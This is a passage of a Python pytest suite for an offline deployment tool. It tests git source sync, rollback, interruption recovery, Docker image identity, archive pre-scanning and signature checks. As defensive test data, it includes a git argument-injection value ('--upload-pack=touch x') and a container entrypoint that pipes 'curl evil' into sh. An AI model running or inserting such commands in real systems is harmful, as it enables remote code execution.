    for what, value in (("legal-on", "true"), ("legal-off", "false")):
        capsys.readouterr()
        assert _rollback(conf, what) == OP.EXIT_USAGE
        out = capsys.readouterr().out
        assert f"OCR_LEGAL_NORMALIZATION_ENABLED={value}" in out and "Nothing was changed" in out
    assert fake_docker.calls()[start:] == []  # not even an inspect
    after = (fake_docker.get(), _journal(tmp_path), sorted(p.name for p in state.rglob("*")))
    assert after == before
    assert _status(conf) == 0


def test_legal_gate_commands_refuse_during_an_update_too(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0  # in maintenance, awaiting approval
    ups = len(_ups(fake_docker))
    for extra in ((), ("--no-maintenance",), ("--maintenance",)):
        assert _rollback(conf, "legal-on", *extra) == OP.EXIT_USAGE
        assert _rollback(conf, "legal-off", *extra) == OP.EXIT_USAGE
    assert len(_ups(fake_docker)) == ups
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"


def test_legal_gate_command_on_a_fresh_deployment_changes_nothing(
    deployment, fake_docker, tmp_path
):
    conf, _, _ = deployment
    start = len(fake_docker.calls())
    assert _rollback(conf, "legal-off") == OP.EXIT_USAGE
    assert fake_docker.calls()[start:] == []
    assert not (tmp_path / "state" / "image-override.yml").exists()
    assert not (tmp_path / "state" / "journal.json").exists()
    assert fake_docker.app()["image_id"] == OLD_ID
    assert "OCR_LEGAL_NORMALIZATION_ENABLED" not in fake_docker.app()["env"]


# --------------------------------------------------------------------------- #
# source synchronisation with real git (F-05, F-24b)
# --------------------------------------------------------------------------- #


def _server_checkout(tmp_path, repo, name="server"):
    """What an offline server has: a checkout that stopped at v1.2.0."""
    server = tmp_path / name
    server.mkdir()
    _git(server, "init", "-q", "-b", "deploy")
    _git(server, "config", "user.email", "ops@example.invalid")
    _git(server, "config", "user.name", "ops")
    _git(server, "fetch", "-q", str(repo), "refs/tags/v1.2.0:refs/tags/v1.2.0")
    _git(server, "merge", "-q", "--ff-only", "v1.2.0")
    (server / ".env").write_text("SURREAL_PASSWORD=do-not-read\n")
    (server / "docker-compose.override.yml").write_text("# local, untracked\n")
    return server


def _sync(conf, server, pkg_dir, manifest=None):
    cfg = OP.load_config(str(conf))
    cfg["DEPLOY_DIR"] = str(server)
    manifest = manifest or OP.load_package(str(pkg_dir))
    OP.sync_source(OP.Deployment(cfg), Path(pkg_dir), manifest)
    return manifest


def test_sync_source_fast_forwards_and_fetches_only_the_release_ref(
    deployment, repo, tmp_path
):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    refs_before = set(_git(server, "for-each-ref", "--format=%(refname)").splitlines())
    manifest = _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == manifest["source"]["commit"]
    assert (
        _git(server, "symbolic-ref", "--short", "HEAD") == "deploy"
    )  # still on its branch
    assert (server / "VERSION").read_text() == "1.3.0\n"
    assert (server / ".env").read_text() == "SURREAL_PASSWORD=do-not-read\n"
    assert (
        server / "docker-compose.override.yml"
    ).read_text() == "# local, untracked\n"
    new_refs = (
        set(_git(server, "for-each-ref", "--format=%(refname)").splitlines())
        - refs_before
    )
    assert new_refs == {
        "refs/cb5400-offline/incoming/1.3.0-rc.1",
        "refs/tags/v1.3.0-rc.1",
    }
    _sync(conf, server, pkg_dir)  # idempotent


def test_sync_source_on_a_detached_head(deployment, repo, tmp_path):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    _git(server, "checkout", "-q", "--detach", "v1.2.0")
    manifest = _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == manifest["source"]["commit"]
    assert _git(server, "rev-parse", "deploy") == _git(
        server, "rev-parse", "v1.2.0"
    )  # branch not moved


def test_sync_source_refuses_diverged_history(deployment, repo, tmp_path):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    (server / "local.txt").write_text("site patch\n")
    _git(server, "add", "local.txt")
    _git(server, "commit", "-qm", "local commit")
    head = _git(server, "rev-parse", "HEAD")
    with pytest.raises(OP.Refused, match="diverges"):
        _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == head and (server / "local.txt").exists()


def test_sync_source_never_overwrites_local_modifications(deployment, repo, tmp_path):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    head = _git(server, "rev-parse", "HEAD")
    (server / "app.py").write_text(
        "print('hot fix on the server')\n"
    )  # the release changes it too
    with pytest.raises(OP.Refused):
        _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == head
    assert (server / "app.py").read_text() == "print('hot fix on the server')\n"
    # an edit the release does not touch is carried over untouched
    _git(server, "checkout", "--", "app.py")
    (server / "README.md").write_text("site notes\n")
    manifest = _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == manifest["source"]["commit"]
    assert (server / "README.md").read_text() == "site notes\n"


def test_sync_source_refuses_a_wrong_commit(deployment, repo, tmp_path):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    head = _git(server, "rev-parse", "HEAD")
    manifest = OP.load_package(str(pkg_dir))
    manifest["source"]["commit"] = _git(
        repo, "rev-parse", "v1.2.0"
    )  # a real commit, not the bundled one
    with pytest.raises(OP.Refused, match="release commit"):
        _sync(conf, server, pkg_dir, manifest)
    manifest["source"]["commit"] = "--upload-pack=touch x"
    with pytest.raises(OP.Refused):
        _sync(conf, server, pkg_dir, manifest)
    assert _git(server, "rev-parse", "HEAD") == head
    assert _git(server, "for-each-ref", "refs/cb5400-offline") == ""


def test_sync_source_refuses_an_invalid_bundle_and_a_bundle_without_the_ref(
    deployment, repo, tmp_path
):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    head = _git(server, "rev-parse", "HEAD")
    manifest = OP.load_package(str(pkg_dir))
    rel = manifest["source"]["git_bundle"]

    broken = tmp_path / "broken"
    (broken / rel).parent.mkdir(parents=True)
    (broken / rel).write_bytes((pkg_dir / rel).read_bytes()[:200] + b"garbage")
    with pytest.raises(OP.Refused):
        _sync(conf, server, broken, manifest)

    other = tmp_path / "other"
    (other / rel).parent.mkdir(parents=True)
    _git(
        repo, "bundle", "create", str(other / rel), "v1.2.0..main"
    )  # a branch, not our ref
    with pytest.raises(OP.Refused, match="release commit under the manifest's ref"):
        _sync(conf, server, other, manifest)

    # a bundle whose base the server does not have (wrong base)
    orphan = tmp_path / "orphan-server"
    orphan.mkdir()
    _git(orphan, "init", "-q", "-b", "deploy")
    _git(orphan, "config", "user.email", "o@example.invalid")
    _git(orphan, "config", "user.name", "o")
    (orphan / "x").write_text("x")
    _git(orphan, "add", ".")
    _git(orphan, "commit", "-qm", "unrelated")
    with pytest.raises(OP.Refused):
        _sync(conf, orphan, pkg_dir, manifest)

    assert _git(server, "rev-parse", "HEAD") == head
    assert _git(server, "for-each-ref", "refs/cb5400-offline") == ""


@pytest.fixture
def git_deployment(tmp_path, package, fake_docker, repo, health_server, monkeypatch):
    pkg, digest = package
    pkg_dir = _unpack_on_server(fake_docker, pkg, digest, tmp_path / "pkgx")
    server = _server_checkout(tmp_path, repo, "deploy-git")
    conf = _write_conf(tmp_path, server, health_server)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    return conf, pkg_dir, server


def test_update_with_source_sync_and_rollback_restores_the_commit(
    git_deployment, fake_docker, repo, tmp_path
):
    conf, pkg_dir, server = git_deployment
    v120 = _git(server, "rev-parse", "HEAD")
    assert _apply(conf, pkg_dir, "--sync-source") == 0
    journal = _journal(tmp_path)
    release = _git(repo, "rev-parse", "HEAD")
    assert _git(server, "rev-parse", "HEAD") == release
    assert journal["source"] == {
        "previous_commit": v120,
        "previous_branch": "deploy",
        "target_commit": release,
    }
    assert journal["baseline"]["source_commit"] == v120
    # F-24b: the application AND its source go back together
    assert _rollback(conf) == 0
    assert _git(server, "rev-parse", "HEAD") == v120
    assert (server / "VERSION").read_text() == "1.2.0\n"
    assert _git(server, "rev-parse", "deploy") == release  # the branch is not rewritten
    assert (server / ".env").read_text() == "SURREAL_PASSWORD=do-not-read\n"
    assert fake_docker.app()["image_id"] == OLD_ID


def test_rollback_does_not_move_a_source_tree_with_local_changes(
    git_deployment, fake_docker, repo, tmp_path, capsys
):
    conf, pkg_dir, server = git_deployment
    assert _apply(conf, pkg_dir, "--sync-source") == 0
    release = _git(server, "rev-parse", "HEAD")
    (server / "README.md").write_text("edited after the update\n")
    capsys.readouterr()
    assert _rollback(conf) == 0  # the application is rolled back...
    assert fake_docker.app()["image_id"] == OLD_ID
    assert _git(server, "rev-parse", "HEAD") == release  # ...the source is left alone
    assert (server / "README.md").read_text() == "edited after the update\n"
    assert "source NOT moved" in capsys.readouterr().out


def test_compose_file_changed_by_the_source_sync_cannot_touch_the_database(
    fake_docker, repo, tmp_path, health_server, monkeypatch
):
    """F-21: the baseline is taken BEFORE the source sync, so a release whose
    compose file changes the database service is refused before any recreate."""
    (repo / "docker-compose.yml").write_text(
        "# x-evil-db: this release moves the database image\n"
    )
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "release with a compose change")
    pkg, digest = _build(repo, tmp_path)
    pkg_dir = _unpack_on_server(fake_docker, pkg, digest, tmp_path / "pkgx")
    server = _server_checkout(tmp_path, repo, "deploy-git")
    conf = _write_conf(tmp_path, server, health_server)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    assert _apply(conf, pkg_dir, "--sync-source") == OP.EXIT_UPDATE
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    assert fake_docker.get()["containers"]["db1"]["id"] == "db-container-original"
    # the interrupted attempt is undone: the new image never ran, the approved image
    # leaves maintenance (quiesce), source back at v1.2.0
    assert _rollback(conf, "interrupted") == 0
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    assert _git(server, "rev-parse", "HEAD") == _git(repo, "rev-parse", "v1.2.0")
    assert not (server / "docker-compose.yml").exists()


def test_attempt_is_not_resumed_across_a_source_sync(
    git_deployment, fake_docker, repo, tmp_path
):
    """After the source moved, the configuration on disk is the release's: a resumed
    run would compare the database service against the wrong side. The attempt is
    closed (application untouched, source back) and started again."""
    conf, pkg_dir, server = git_deployment
    v120 = _git(server, "rev-parse", "HEAD")
    fake_docker.edit(lambda s: s["rapidocr"].update(copied={}, on_volume=[]))
    assert (
        _apply(conf, pkg_dir, "--sync-source") == OP.EXIT_UPDATE
    )  # stops after K, before the recreate
    assert _git(server, "rev-parse", "HEAD") != v120
    assert (
        _apply(conf, pkg_dir, "--sync-source", "--accept-missing-rapidocr")
        == OP.EXIT_UPDATE
    )
    assert not _update_ups(fake_docker)
    assert _rollback(conf, "interrupted") == 0
    assert not _update_ups(fake_docker) and _git(server, "rev-parse", "HEAD") == v120
    assert _apply(conf, pkg_dir, "--sync-source", "--accept-missing-rapidocr") == 0
    assert fake_docker.app()["image_id"] == IMAGE_ID


def test_sync_source_needs_a_git_checkout(deployment):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir, "--sync-source") == OP.EXIT_UPDATE


# --------------------------------------------------------------------------- #
# Phase 12D5: interruption at every step that changes something (brief section 4)
# --------------------------------------------------------------------------- #


def _compose_up(argv):
    return argv[:2] == ["docker", "compose"] and "up" in argv


def _new_image_up(argv):
    return _compose_up(argv) and any(x.endswith("override-update.yml") for x in argv)


KILL_POINTS = [
    ("update", "git fetch", lambda a: a[:1] == ["git"] and "fetch" in a),
    ("update", "git merge", lambda a: a[:1] == ["git"] and "merge" in a and "--ff-only" in a),
    ("update", "docker load", lambda a: a[:2] == ["docker", "load"]),
    ("update", "docker tag rollback-tag", lambda a: a[:2] == ["docker", "tag"] and ":rollback-" in a[-1]),
    ("update", "compose up quiesce", lambda a: _compose_up(a) and not _new_image_up(a)),
    ("update", "compose up new image", _new_image_up),
    ("finish", "docker tag deploy-tag", lambda a: a[:2] == ["docker", "tag"] and a[-1] == DEPLOY_TAG),
    ("finish", "compose up normal mode", _compose_up),
    ("rollback", "docker tag deploy-tag", lambda a: a[:2] == ["docker", "tag"] and a[-1] == DEPLOY_TAG),
    ("rollback", "compose up rollback", _compose_up),
]
KILL_CASES = [
    (command, point, matcher, when)
    for command, point, matcher in KILL_POINTS
    for when in ("before", "after")
] + [("finish", "journal save", None, "before"), ("rollback", "journal save", None, "before")]


@pytest.mark.parametrize(
    "command, point, matcher, when",
    KILL_CASES,
    ids=[f"{c}-{p.replace(' ', '-')}-{w}" for c, p, _, w in KILL_CASES],
)
def test_interrupted_step_is_reported_and_a_rollback_restores_image_and_source(
    git_deployment, fake_docker, repo, tmp_path, monkeypatch, capsys, command, point, matcher, when
):
    """kill -9 (KeyboardInterrupt) once BEFORE and once AFTER the real call of every
    step that changes something (git fetch / merge, docker load, docker tag, every
    compose up, the journal save that closes finish / rollback). Afterwards status is
    never 0 and names the state; DEPLOY_IMAGE_TAG is the approved image unless the kill
    came after a successful tag move of finish / rollback (reported as an interrupted
    transition); a rollback brings back the approved image AND the source commit."""
    conf, pkg_dir, server = git_deployment
    v120 = _git(server, "rev-parse", "HEAD")
    if command in ("finish", "rollback"):
        assert _apply(conf, pkg_dir, "--sync-source") == 0
    if command == "rollback":
        assert _finish(conf) == 0
    real_run, real_save = OP.run, OP.Journal.save
    fired: List[Any] = []

    def run(cmd, *a, **k):
        if matcher is not None and not fired and matcher(cmd):
            fired.append(cmd)
            if when == "after":
                real_run(cmd, *a, **k)
            raise KeyboardInterrupt(point)
        return real_run(cmd, *a, **k)

    def save(self):
        last = (self.data.get("steps") or [{}])[-1].get("step")
        closing = (last == "Q_checks" and self.data.get("status") == OP.COMPLETED) or (
            last == "ROLLBACK_done" and self.data.get("status") == OP.ROLLED_BACK
        )
        if matcher is None and not fired and closing:
            fired.append(last)
            raise KeyboardInterrupt(point)
        return real_save(self)

    monkeypatch.setattr(OP, "run", run)
    monkeypatch.setattr(OP.Journal, "save", save)
    with pytest.raises(KeyboardInterrupt):
        {"update": lambda: _apply(conf, pkg_dir, "--sync-source"),
         "finish": lambda: _finish(conf), "rollback": lambda: _rollback(conf)}[command]()  # fmt: skip
    monkeypatch.setattr(OP, "run", real_run)
    monkeypatch.setattr(OP.Journal, "save", real_save)
    assert fired, "the kill point was not reached"

    capsys.readouterr()
    rc = _status(conf)
    out = capsys.readouterr().out
    assert rc in (OP.EXIT_UNDECIDED, OP.EXIT_DRIFT), out
    assert "INTERRUPTED TRANSITION" in out or "is undecided (status" in out
    tag, approved = fake_docker.get()["images"][DEPLOY_TAG], _approved(tmp_path)["image_id"]
    if command == "update":
        assert tag == approved  # an update never moves the deploy tag
    elif tag != approved:  # finish / rollback killed after its tag move: reported
        assert "INTERRUPTED TRANSITION" in out and "was moved to" in out
    # the way out: `rollback interrupted` for an update, `rollback app` otherwise
    assert _rollback(conf, "interrupted" if command == "update" else "app") == 0
    assert fake_docker.app()["image_id"] == OLD_ID
    assert fake_docker.get()["images"][DEPLOY_TAG] == OLD_ID
    assert _approved(tmp_path)["image_id"] == OLD_ID
    assert _git(server, "rev-parse", "HEAD") == v120
    assert fake_docker.get()["containers"]["db1"]["id"] == "db-container-original"
    assert _status(conf) == 0


# --------------------------------------------------------------------------- #
# Phase 12D5: image identity with the shapes of a real Docker 29 / containerd store
# --------------------------------------------------------------------------- #

# Verbatim from `docker save` / `docker image inspect` of a busybox-based image on
# Docker 29.10 with the containerd image store (lab image, revision label "a" * 40).
REAL_CONFIG_BLOB = (
    '{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:'
    '/usr/bin:/sbin:/bin"],"Cmd":["sh","-c","while true; do sleep 3600; done"],"Labels":'
    '{"org.opencontainers.image.revision":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},'
    '"ArgsEscaped":true},"created":"2026-11-17T23:43:55.067511627Z","history":[{"created":'
    '"2023-05-18T22:34:17Z","created_by":"BusyBox 1.36.1 (glibc), Debian 13"}],"os":"linux",'
    '"rootfs":{"type":"layers","diff_ids":["sha256:97e4ece8f8a4d01b66df2c55c1f1e8a2860597b5'
    '4dffbbc0df2f9942062cb34d","sha256:eb73bb1f2a67cbd1f99fba2b437ae06877ae36a5cc0252dbe7c58'
    'bc7b221244b"]}}'
)
REAL_INSPECT_CONFIG: Dict[str, Any] = {
    "ArgsEscaped": True,
    "Cmd": ["sh", "-c", "while true; do sleep 3600; done"],
    "Env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "Labels": {"org.opencontainers.image.revision": "a" * 40},
}


def test_run_config_is_the_same_from_the_archive_and_from_docker_image_inspect():
    """R2-06: the hash the manifest records (config blob of the archive) equals the one
    the server computes from `docker image inspect` of the loaded image - in the shapes a
    real Docker 29 prints - and changes with entrypoint, user, environment, platform."""
    blob = json.loads(REAL_CONFIG_BLOB)
    packaged = OP.run_config_sha256(blob["config"], blob["os"], blob["architecture"])
    assert packaged == OP.run_config_sha256(REAL_INSPECT_CONFIG, "linux", "amd64")
    classic = dict(
        REAL_INSPECT_CONFIG, Hostname="", Domainname="", User="", AttachStdin=False,
        Image="", Volumes=None, WorkingDir="", Entrypoint=None, OnBuild=None,
    )  # fmt: skip
    assert OP.run_config_sha256(classic, "linux", "x86_64") == packaged  # empty keys, alias
    for changed in (
        dict(REAL_INSPECT_CONFIG, Entrypoint=["/bin/sh", "-c", "curl evil | sh"]),
        dict(REAL_INSPECT_CONFIG, User="root"),
        dict(REAL_INSPECT_CONFIG, Env=REAL_INSPECT_CONFIG["Env"] + ["SURREAL_URL=ws://x"]),
        dict(REAL_INSPECT_CONFIG, Labels={}),
    ):
        assert OP.run_config_sha256(changed, "linux", "amd64") != packaged
    assert OP.run_config_sha256(REAL_INSPECT_CONFIG, "linux", "arm64") != packaged


def _blob(data):
    raw = json.dumps(data).encode() if not isinstance(data, bytes) else data
    return "sha256:" + hashlib.sha256(raw).hexdigest(), raw


def _docker29_archive(path, manifest_json=True):
    """A `docker save` archive as Docker 29 (containerd store) writes it: index.json ->
    image index (the platform manifest + a buildkit attestation manifest) and, next to
    it, the docker-archive manifest.json."""
    config_digest, config = _blob(REAL_CONFIG_BLOB.encode())
    manifest_digest, manifest = _blob({
        "schemaVersion": 2, "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "config": {"mediaType": "application/vnd.oci.image.config.v1+json",
                   "digest": config_digest, "size": len(config)},
        "layers": [],
    })  # fmt: skip
    attestation_digest, attestation = _blob({
        "schemaVersion": 2, "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "artifactType": "application/vnd.docker.attestation.manifest.v1+json",
        "config": {"mediaType": "application/vnd.oci.empty.v1+json",
                   "digest": _blob(b"{}")[0], "size": 2},
        "layers": [],
    })  # fmt: skip
    index_digest, index = _blob({
        "schemaVersion": 2, "mediaType": "application/vnd.oci.image.index.v1+json",
        "manifests": [
            {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": manifest_digest,
             "size": len(manifest), "platform": {"architecture": "amd64", "os": "linux"}},
            {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": attestation_digest,
             "size": len(attestation),
             "annotations": {"vnd.docker.reference.digest": manifest_digest,
                             "vnd.docker.reference.type": "attestation-manifest"},
             "platform": {"architecture": "unknown", "os": "unknown"}},
        ],
    })  # fmt: skip
    outer = json.dumps({
        "schemaVersion": 2, "mediaType": "application/vnd.oci.image.index.v1+json",
        "manifests": [{"mediaType": "application/vnd.oci.image.index.v1+json",
                       "digest": index_digest, "size": len(index),
                       "annotations": {"io.containerd.image.name": "docker.io/lab/app:1.3.0",
                                       "org.opencontainers.image.ref.name": "1.3.0"}}],
    }).encode()  # fmt: skip
    files = [("index.json", outer), ("oci-layout", b'{"imageLayoutVersion":"1.0.0"}')]
    for digest, raw in ((config_digest, config), (manifest_digest, manifest),
                        (attestation_digest, attestation), (index_digest, index)):  # fmt: skip
        files.append(("blobs/" + digest.replace(":", "/"), raw))
    if manifest_json:
        files.append(("manifest.json", json.dumps([{
            "Config": "blobs/" + config_digest.replace(":", "/"),
            "RepoTags": ["lab/app:1.3.0"], "Layers": [],
        }]).encode()))  # fmt: skip
    with tarfile.open(path, "w") as tar:
        for name, raw in files:
            info = tarfile.TarInfo(name)
            info.size = len(raw)
            tar.addfile(info, io.BytesIO(raw))
    return config_digest, index_digest


@pytest.mark.parametrize("manifest_json", [True, False], ids=["docker29", "oci-only"])
def test_image_archive_identity_of_a_docker29_containerd_archive(tmp_path, manifest_json):
    """F-20 / R2-06 with the real layout: the image ID of the containerd store is the
    INDEX digest, the config digest is another value, the index lists an attestation
    manifest, the image name is fully qualified. Both readings give the same identity."""
    archive = tmp_path / "save.tar"
    config_digest, index_digest = _docker29_archive(archive, manifest_json)
    ident = OP.image_archive_identity(archive)
    assert ident["layout"] == ("docker-archive" if manifest_json else "oci")
    assert ident["repo_tags"] == ["lab/app:1.3.0"]
    assert ident["config_digest"] == config_digest != index_digest
    assert ident["diff_ids"] == json.loads(REAL_CONFIG_BLOB)["rootfs"]["diff_ids"]
    assert ident["run_config_sha256"] == OP.run_config_sha256(REAL_INSPECT_CONFIG, "linux", "amd64")
    image = {"id": index_digest, "config_digest": config_digest, "diff_ids": ident["diff_ids"],
             "run_config_sha256": ident["run_config_sha256"]}  # fmt: skip
    assert OP.same_image(index_digest, [], image) == "image id"  # containerd -> containerd
    assert "classic" in OP.same_image(config_digest, [], image)  # classic store server
    assert "run configuration" in OP.same_image(
        "sha256:" + "5" * 64, ident["diff_ids"], image, ident["run_config_sha256"]
    )


def test_the_target_tag_is_checked_again_right_before_the_recreate(deployment, fake_docker, tmp_path):
    """R2-06 / F-25: the tag of the package moved between `docker load` and the recreate
    (here: during the backup) -> the update stops before the new image runs."""
    conf, pkg_dir, _ = deployment
    st = fake_docker.path
    script = tmp_path / "retag.py"
    script.write_text(
        "import json\n"
        f"s = json.load(open({str(st)!r}))\n"
        f"s['images'][{TARGET!r}] = {OTHER_ID!r}\n"
        f"s['image_configs'][{OTHER_ID!r}] = {OTHER_CONFIG!r}\n"
        f"json.dump(s, open({str(st)!r}, 'w'))\n"
    )
    _set_conf(conf, BACKUP_CMD=f"{sys.executable} {script}", BACKUP_VERIFY_CMD="true")
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    assert not _update_ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID


# --------------------------------------------------------------------------- #
# Phase 12D5: archive pre-scan before authentication (R2-19)
# --------------------------------------------------------------------------- #


def _pax_record(key, value):
    body = f" {key}={value}\n"
    length = len(body) + 1
    while len(str(length)) + len(body) != length:
        length = len(str(length)) + len(body)
    return f"{length}{body}".encode()


def test_prescan_accepts_normal_extended_headers_and_refuses_oversized_ones(tmp_path):
    ok = tmp_path / "ok.tar.gz"
    with tarfile.open(ok, "w:gz", format=tarfile.PAX_FORMAT) as tar:
        info = tarfile.TarInfo("pkg/" + "x" * 150)  # needs a pax path record
        info.size = 5
        info.pax_headers = {"comment": "y" * 2000}
        tar.addfile(info, io.BytesIO(b"hello"))
    OP.prescan_archive(ok)
    assert [m.name for m in OP.inspect_archive(ok)] == ["pkg/" + "x" * 150]
    for kind, build in (
        ("pax", lambda t: t.addfile(_pax_member("pkg/a", 70 * 1024), io.BytesIO(b"a"))),
        ("gnu long link", lambda t: _gnu_long_link(t, 70 * 1024)),
    ):
        bad = tmp_path / f"{kind.replace(' ', '-')}.tar.gz"
        fmt = tarfile.PAX_FORMAT if kind == "pax" else tarfile.GNU_FORMAT
        with tarfile.open(bad, "w:gz", format=fmt) as tar:
            build(tar)
        with pytest.raises(OP.Refused, match="oversized extended tar header"):
            OP.inspect_archive(bad)
    record = _pax_record("size", 9 * 1024**3) + _pax_record("path", "pkg/big")
    assert OP._pax_size(record) == 9 * 1024**3  # >= 8 GiB members carry their size here
    assert OP._pax_size(_pax_record("path", "pkg/x")) is None
    broken = tmp_path / "broken.tar"
    with tarfile.open(broken, "w") as tar:
        info = tarfile.TarInfo("pkg/a")
        info.size = 1
        tar.addfile(info, io.BytesIO(b"a"))
    raw = bytearray(broken.read_bytes())
    raw[0:3] = b"zzz"  # the header checksum no longer matches
    broken.write_bytes(bytes(raw))
    with pytest.raises(OP.Refused, match="checksum"):
        OP.prescan_archive(broken)


def _pax_member(name, comment_size):
    info = tarfile.TarInfo(name)
    info.size = 1
    info.pax_headers = {"comment": "z" * comment_size}
    return info


def _gnu_long_link(tar, size):
    info = tarfile.TarInfo("pkg/link")
    info.type = tarfile.SYMTYPE
    info.linkname = "t" * size
    tar.addfile(info)


# --------------------------------------------------------------------------- #
# Phase 12D5: package trust on the server (R2-07)
# --------------------------------------------------------------------------- #


def test_package_folder_writable_by_others_or_without_a_trusted_record_is_refused(
    deployment, tmp_path
):
    conf, pkg_dir, _ = deployment

    def preflight():
        return _server("preflight", conf, pkg_dir, "--backup-reference", "x")

    assert preflight() == 0
    script = pkg_dir / "scripts" / "update.sh"
    script.chmod(0o777)  # a file anybody can replace after verification
    assert preflight() == OP.EXIT_PREFLIGHT
    script.chmod(0o755)
    pkg_dir.parent.chmod(0o777)  # an ancestor anybody can write
    assert preflight() == OP.EXIT_PREFLIGHT
    pkg_dir.parent.chmod(0o1777)  # sticky (like /tmp): allowed as an ancestor
    assert preflight() == 0
    pkg_dir.parent.chmod(0o755)
    for record in (tmp_path / "state" / "verified").iterdir():
        record.unlink()  # the trusted record is gone: the package next to it proves nothing
    assert (pkg_dir.parent / "verify-report.json").exists()
    assert preflight() == OP.EXIT_PREFLIGHT


@needs_ssh_keygen
def test_signature_policy_required_is_enforced_on_every_use(
    fake_docker, repo, tmp_path, signing, health_server, monkeypatch
):
    """With a trusted key installed the policy is `required`: verify refuses an unsigned
    package even with the trusted-channel hash, and every server command checks the
    signature again (from the policy, never from a flag of a report)."""
    key, signers = signing
    deploy = tmp_path / "deploy"
    deploy.mkdir()
    conf = _write_conf(tmp_path, deploy, health_server, ALLOWED_SIGNERS=signers)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    unsigned, digest = _build(repo, tmp_path, out="unsigned")
    assert _verify(unsigned, tmp_path / "u", "--expected-sha256", digest) == OP.EXIT_VERIFY
    _set_conf(conf, SIGNATURE_POLICY="optional")  # explicit operator choice
    assert _verify(unsigned, tmp_path / "u2", "--expected-sha256", digest) == 0
    _set_conf(conf, SIGNATURE_POLICY="required")
    signed, _ = _build(repo, tmp_path, "--sign-key", str(key), out="signed")
    assert _verify(signed, tmp_path / "s") == 0
    pkg_dir = next(p for p in (tmp_path / "s").iterdir() if p.is_dir())
    fake_docker.forget_image(TARGET)
    assert _server("preflight", conf, pkg_dir, "--backup-reference", "x") == 0
    (pkg_dir / "manifest.json.sig").unlink()
    assert _server("preflight", conf, pkg_dir, "--backup-reference", "y") == OP.EXIT_PREFLIGHT
    u2 = next(p for p in (tmp_path / "u2").iterdir() if p.is_dir())
    assert _server("preflight", conf, u2, "--backup-reference", "z") == OP.EXIT_PREFLIGHT


# --------------------------------------------------------------------------- #
# Phase 12D5: the deployment contract in preflight; leftovers; configuration keys
# --------------------------------------------------------------------------- #


def test_preflight_refuses_every_breach_of_the_contract(deployment, fake_docker, tmp_path, capsys):
    conf, pkg_dir, _ = deployment

    def preflight():
        return _server("preflight", conf, pkg_dir, "--backup-reference", "x")

    def breach(edit, undo, needle):
        fake_docker.edit(edit)
        capsys.readouterr()
        assert preflight() == OP.EXIT_PREFLIGHT
        assert needle in capsys.readouterr().out
        fake_docker.edit(undo)

    assert preflight() == 0
    # pre-existing drift: the application does not run the image DEPLOY_IMAGE_TAG names
    breach(lambda s: s["containers"]["c1"].update(image_id=OTHER_ID),
           lambda s: s["containers"]["c1"].update(image_id=OLD_ID), "pre-existing drift")
    # REQUIRED_APP_ENV missing in the effective configuration / in the running container
    app_env = lambda s: s["config"]["services"]["open_notebook"]["environment"]  # noqa: E731
    breach(lambda s: app_env(s).pop("OCR_OFFLINE"),
           lambda s: app_env(s).update(OCR_OFFLINE="true"), "contract step 2")
    breach(lambda s: s["containers"]["c1"]["env"].update(OCR_RAPIDOCR_PERSISTENT="false"),
           lambda s: s["containers"]["c1"]["env"].update(OCR_RAPIDOCR_PERSISTENT="true"),
           "contract step 2")
    assert preflight() == 0
    # approved.json names another image than the deploy tag
    state = tmp_path / "state"
    (state / "approved.json").write_text(json.dumps({"image_id": OTHER_ID, "how": "finish"}))
    assert preflight() == OP.EXIT_PREFLIGHT
    (state / "approved.json").unlink()
    assert preflight() == 0


def test_a_leftover_12d3_override_is_reported_and_removed_only_when_it_is_ours(
    deployment, fake_docker, tmp_path, capsys
):
    conf, pkg_dir, _ = deployment
    leftover = tmp_path / "state" / "image-override.yml"
    leftover.write_text(
        'services:\n  open_notebook:\n    image: "chatbot5400:1.3.0-rc.1"\n    pull_policy: '
        'never\n    environment:\n      OCR_OFFLINE: "true"\n'
    )
    capsys.readouterr()
    assert _status(conf) == 0
    assert "image-override.yml" in capsys.readouterr().out and leftover.exists()  # read-only
    assert _apply(conf, pkg_dir) == 0
    assert not leftover.exists()  # the tool's own file: removed, logged
    leftover.write_text("# the operator's own notes\n")
    assert _finish(conf) == 0
    assert leftover.read_text() == "# the operator's own notes\n"  # not ours: kept, unused


def test_obsolete_and_deprecated_configuration_keys(tmp_path, capsys):
    conf = tmp_path / "c.conf"
    conf.write_text("APP_ENV_OVERRIDES=OCR_OFFLINE=true\nBACKUP_MAX_AGE_MINUTES=inf\n")
    cfg = OP.load_config(str(conf))
    out = capsys.readouterr().out
    assert cfg["REQUIRED_APP_ENV"] == "OCR_OFFLINE=true"
